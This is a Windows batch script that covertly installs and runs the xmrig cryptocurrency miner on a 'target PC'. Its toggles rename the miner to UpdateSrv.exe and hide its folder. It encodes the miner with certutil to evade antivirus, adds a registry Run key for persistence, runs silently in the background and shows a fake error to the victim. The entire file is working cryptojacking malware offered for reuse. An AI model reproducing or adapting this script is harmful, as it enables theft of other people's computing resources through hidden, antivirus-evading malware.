@echo off
REM ============================================================================
REM Sorry I had a bad day... So I had to do something useful with my
REM time. Figured I'd build something quick and release it.
REM We have many more projects being worked on, and am loving the 
REM support of the Community!
REM
REM This script is written to be flexible with MANY miners. If you
REM have a config, please share with the community.
REM 
REM                               -REDD-
REM                https://www.private-locker.com
REM
REM ============================================================================
REM ERRORS:
REM ============================================================================
REM Error 1     - Missing Original Miner for encryption/decryption.
REM               Check "ORIGMINER" filename in the folder this script
REM               is located inside.
REM ============================================================================
REM TOGGLES FOR EASE OF MANIPULATION OF SCRIPT. 
REM ============================================================================
SET "BACKGROUND=NO"
SET "ENCRYPTION=NO"
SET "FAKEAPP=NO"
SET "FAKEERROR=NO"
SET "HIDELOCATION=NO"
SET "MINEREXTRAS=NO"
SET "AUTOSTART=NO"
REM ============================================================================
REM MINER CREDENTIALS:
REM ============================================================================
SET "SERVER=POOL_SERVER_ADDRESS_HERE"
SET "PORT=PORT_NUMBER_HERE"
SET "USER=WALLET_ADDRESS_HERE"
SET "PASS=x"
SET "ALGO=ALGO_HERE"
REM ============================================================================
REM AUTOSTART    - CREATES A REGISTRY ENTRY TO START A GENERATED BATCH
REM                FILE IN THE TARGET PC'S FOLDER.
REM BACKGROUND   - RUNS THE MINER IN THE BACKGROUND WITHOUT DISPLAYING
REM                ANY PROMPT ON THE SCREEN.
REM ENCRYPTION   - USES A NATIVE TOOL IN WINDOWS TO ENCRYPT THE EXE OF
REM                THE MINER, TRANSFER TO TARGET PC, DECRYPT. BYPASSES
REM                60% OF ANTIVIRUSES.
REM FAKEAPP      - RUNS THE ORIGINAL MINER AS A DIFFERENT EXE NAME.
REM                (DOES NOT RENAME THE APP INSIDE THE MANIFEST aka -
REM                 APPEARS THE SAME ON TASK MANAGER.)
REM FAKEERROR    - OPENS A FAKE ERROR MESSAGE BOX WITH YOUR CUSTOM 
REM                STRING OF TEXT USING "ERRORTXT".
REM HIDELOCATION - HIDES THE DIRECTORY OF THE MINER FOLDER ON TARGET
REM                PC WHEN RAN.
REM MINEREXTRAS  - PULLS THE EXTRA DLL FILES WITH THE MINER. ONLY USE
REM                IF THE MINER REQUIRES EXTRA DLL'S.
REM 
REM =============================================================================
SET "ORIGMINER=xmrig.exe"
SET "MINEREXTRAFILES=msvcr110.dll"
SET "ENCRYPTED=inital.cert"
SET "DECRYPTED=%MINER%"
SET "AUTONAME=Miner Restart"
SET "AUTOFILE1=autostart.reg"
SET "AUTOFILE2=autostart.bat"
SET "FAKENAME=UpdateSrv.exe"
SET "SFLAG=-o"
SET "PFLAG=-p"
SET "UFLAG=-u"
SET "PASSFLAG=-p"
SET "CUSTOMFLAGS=--av=0 --donate-level=1 --cpu-priority=0"
SET "ENCRYPT=certutil -encode"
SET "DECRYPT=certutil -decode"
SET "TARGETDIR=%APPDATA%\TEST"
SET "TARGETDIRNAME=TEST"
SET "ORIGDIR=%~dp0"
SET "HIDE=attrib +s +h"
SET "UNHIDE=attrib -s -h"
SET "ERRORTXT=Your System Specifications does not meet the necessary Requirements."
REM Helper Variables for the script.
SET "MINER=NULL"
IF "%AUTOSTART%" EQU "YES" (SET "AUTOSTART=1") ELSE (SET "AUTOSTART=0")
IF "%ENCRYPTION%" EQU "YES" (SET "ENCRYPTION=1") ELSE (SET "ENCRYPTION=0")
IF "%BACKGROUND%" EQU "YES" (SET "BACKGROUND=1") ELSE (SET "BACKGROUND=0")
IF "%HIDELOCATION%" EQU "YES" (SET "HIDELOCATION=1") ELSE (SET "HIDELOCATION=0")
IF "%MINEREXTRAS%" EQU "YES" (SET "MINEREXTRAS=1") ELSE (SET "MINEREXTRAS=0")
IF "%FAKEAPP%" EQU "YES" (SET "FAKEAPP=1") ELSE (SET "FAKEAPP=0")
IF "%CLEANUP%" EQU "YES" (SET "CLEANUP=1") ELSE (SET "CLEANUP=0")
IF "%FAKEERROR%" EQU "YES" (SET "FAKEERROR=1") ELSE (SET "FAKEERROR=0")
REM Detect which name to use for the Miners Application Name..
IF "%FAKEAPP%" EQU "1" (SET "MINER=%FAKENAME%") ELSE (SET "MINER=%ORIGMINER%")

REM Finally after all that craziness.. Time for THIS craziness..
IF EXIST "%TARGETDIR%\%MINER%" (GOTO 0) ELSE (GOTO 1)
:0
tasklist /FI "IMAGENAME eq %MINER%" 2>NUL | find /I /N "%MINER%">NUL
IF "%ERRORLEVEL%"=="0" (GOTO END) ELSE (GOTO START)
:1

IF EXIST "%TARGETDIR%\%ENCRYPTED%" (GOTO DEC) ELSE (GOTO PULL)
:PULL
IF EXIST "%ORIGDIR%\%DECRYPTED%" (GOTO ENC) ELSE (echo ERROR 1 && GOTO END)
:DEC
IF "%ENCRYPTION%" EQU "1" (
	CD "%TARGETDIR%"
	%DECRYPT% %ENCRYPTED% %MINER% && DEL /f "%TARGETDIR%\%ENCRYPTED%" >NUL
	GOTO START
	) ELSE (
	GOTO START
)
:ENC

IF "%ENCRYPTION%" EQU "1" (
	CD "%ORIGDIR%"
	IF NOT EXIST "%TARGETDIR%\%ENCRYPTED%" %ENCRYPT% %MINER% %ENCRYPTED% >NUL
	IF NOT EXIST "%TARGETDIR%" md "%TARGETDIR%" >NUL
	IF NOT EXIST "%TARGETDIR%\%ENCRYPTED%" COPY %ENCRYPTED% "%TARGETDIR%" && IF "%MINEREXTRAS%" EQU "1" COPY "%MINEREXTRAFILES%" "%TARGETDIR%" >NUL
	CD "%TARGETDIR%"
	GOTO DEC
	) ELSE (
	CD "%ORIGDIR%"
	IF NOT EXIST "%TARGETDIR%" md "%TARGETDIR%" >NUL
	IF "%FAKEAPP%" EQU "1" COPY %ORIGMINER% %MINER% >NUL
	IF NOT EXIST "%TARGETDIR%\%MINER%" COPY %MINER% "%TARGETDIR%" && IF "%MINEREXTRAS%" EQU "1" COPY "%MINEREXTRAFILES%" "%TARGETDIR%" >NUL
	IF "%FAKEAPP%" EQU "1" DEL /f "%MINER%" >NUL
	GOTO START
)
:START
CD %TARGETDIR%
IF "%AUTOSTART%" EQU "1" (
@echo Windows Registry Editor Version 5.00>%AUTOFILE1%
@echo. >>%AUTOFILE1%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>%AUTOFILE1%
@echo. >>%AUTOFILE1%
@echo "%AUTONAME%"="%SystemDrive%\\Users\\%username%\\Roaming\\Local\\%TARGETDIRNAME%\\%AUTOFILE2%">>%AUTOFILE1%
@echo. >>%AUTOFILE1%
IF "%BACKGROUND%" EQU "1" echo %MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS% --background >%AUTOFILE2%
IF "%BACKGROUND%" EQU "0" echo %MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS% >%AUTOFILE2%
reg import %AUTOFILE1% >NUL
IF NOT EXIST "%TARGETDIR%\%AUTOFILE2%" COPY %AUTOFILE2% "%TARGETDIR%" >NUL
DEL /f %AUTOFILE1%
)
IF "%CLEANUP%" EQU "1" (
	del /f "%TARGETDIR%\%ENCRYPTED%" >NUL
	del /f "%TARGETDIR%\%ENCRYPTED%" >NUL
)
IF "%HIDELOCATION%" EQU "1" (
	%HIDE% "%TARGETDIR%" >NUL
	) ELSE (
	%UNHIDE% "%TARGETDIR%" >NUL
)
IF "%FAKEERROR%" EQU "1" (
	echo Set objArgs = WScript.Arguments >1.vbs
	echo messageText = objArgs^(0^) >>1.vbs
	echo MsgBox messageText >>1.vbs
	cscript 1.vbs "%ERRORTXT%" >NUL
	del /f 1.vbs >NUL
)
IF "%BACKGROUND%" EQU "1" (
	CD %TARGETDIR%
	%MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS% --background
	) ELSE (
	CD %TARGETDIR%
	%MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS%
)
GOTO END

:END
PAUSE
EXIT /B
:EOF
